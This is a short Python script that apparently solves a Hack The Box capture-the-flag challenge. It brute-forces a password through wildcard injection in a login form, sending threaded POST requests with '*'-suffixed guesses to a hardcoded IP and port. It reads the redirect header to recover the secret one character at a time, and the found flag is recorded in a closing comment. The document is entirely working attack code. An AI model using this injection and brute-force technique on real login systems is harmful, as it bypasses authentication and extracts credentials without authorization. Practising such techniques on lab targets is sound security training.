import requests, string, threading, time
found = True
flag = "HTB"
def send_request(letter):
    global found, flag
    payload = f'{flag}{letter}*'
    try:
        res = requests.post('http://134.209.27.142:32236/login', data={'username':'Reese', 'password':f'{flag}{letter}*'}, allow_redirects=False)
        if not res.headers['Location'] == '/login?message=Authentication%20failed':
            if letter == '}':
                found = False
            flag += letter
            print(f'[+] Flag -> {flag}', end="\r")
    except:
        pass


if __name__ == "__main__":
    while found:
        for ascii in string.printable:
            if ascii == '*':
                continue
            threading.Thread(target=send_request, args=(ascii, )).start()
        time.sleep(2)


# HTB{d1rectory_h4xx0r_is_k00l}